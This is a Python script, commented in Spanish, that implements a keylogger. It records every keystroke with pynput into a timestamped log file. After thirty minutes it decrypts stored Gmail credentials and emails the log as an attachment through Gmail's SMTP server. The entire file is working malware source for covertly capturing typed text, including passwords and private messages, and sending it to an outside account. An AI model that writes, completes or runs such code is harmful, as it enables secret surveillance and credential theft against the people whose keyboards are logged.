import datetime
from pynput.keyboard import Listener
import time
from cryptography.fernet import Fernet
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
import smtplib
from cryptography.fernet import Fernet


def CAPTURA_DE_TECLAS():
    
    FECHA = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    
    NOMBRE_DE_REGISTRO = 'Registro_{}.txt'.format(FECHA)
    
    f = open("../DefaultKey/Output/"+NOMBRE_DE_REGISTRO, 'w')
    EMAIL = ("../DefaultKey/Output/"+NOMBRE_DE_REGISTRO)
    
    t0 = time.time()

    def TECLADO (TECLA):
        
        TECLA=str(TECLA)
        
        if TECLA == 'Key.enter':
            f.write('\n') 
        elif TECLA =='Key.space':
            f.write(' ')
        elif TECLA =='Key.caps_lock':
            f.write('')
        elif TECLA =='Key.left':
            f.write('')
        elif TECLA =='Key.up':
            f.write('')
        elif TECLA =='Key.down':
            f.write('')
        elif TECLA =='Key.right':
            f.write('')
        elif TECLA =='Key.shift':
            f.write('')
        elif TECLA =='Key.backspace':
            f.write('')
        elif TECLA == '<65027>':
            f.write('alt_gr+')
        elif TECLA == 'Key.alt_gr':
            f.write('alt_gr')
        else:
            f.write(TECLA.replace("'", ""))  

        
        
        if time.time() - t0 > 1800 :
            f.close()
            ENVIAR_REGISTRO(EMAIL)
            
        
    with Listener(TECLADO) as l:
        l.join()

def ENVIAR_REGISTRO(ARCHIVO):

    def CARGAR_KEY():
        return open("../DefaultKey/Config/password.key","rb").read()

    LLAVE = CARGAR_KEY()

    PASSWORD_KEY = Fernet(LLAVE)

    PASSWORD_ENC = (open('../DefaultKey/Config/password.enc', 'rb').read())

    PASSWORD = PASSWORD_KEY.decrypt(PASSWORD_ENC).decode()

    DATO_ENC = (open('../DefaultKey/Config/dato.enc', 'rb').read())
    
    DATO = PASSWORD_KEY.decrypt(DATO_ENC).decode()
    
    msg = MIMEMultipart()
    MENSAJE = "Registros actuales"
    msg['From'] = DATO
    msg['To'] = DATO
    msg['Subject'] = 'Registros'

    msg.attach(MIMEText(MENSAJE, 'plain'))
    
    attachment = open(ARCHIVO, 'r')

    p = MIMEBase('application','octet-stream')
    p.set_payload((attachment).read())
    p.add_header('Content-Disposition', "attachment; filename = %s" % str(ARCHIVO))
    msg.attach(p)

    server = smtplib.SMTP('smtp.gmail.com: 587')
    server.starttls()
    server.login(msg['From'],PASSWORD)
    server.sendmail(msg['From'],msg['To'],msg.as_string())
    server.quit()
    
if __name__ == '__main__':

        CAPTURA_DE_TECLAS()
 
